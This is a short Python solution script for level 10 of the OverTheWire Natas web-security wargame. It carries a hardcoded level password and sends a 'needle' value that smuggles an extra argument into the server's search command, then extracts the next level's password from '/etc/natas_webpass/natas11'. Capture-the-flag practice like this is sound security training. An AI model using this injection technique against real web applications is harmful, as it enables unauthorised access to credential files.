import requests
import re


username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
url = "http://%s.natas.labs.overthewire.org" % username
response = requests.post(url , data={"needle":". /etc/natas_webpass/natas11","submit":"submit"},auth=(username,password))
flag = response.text
x = re.findall("<pre>\n/etc/natas_webpass/natas11:(.*)",flag)[0]

print(x) 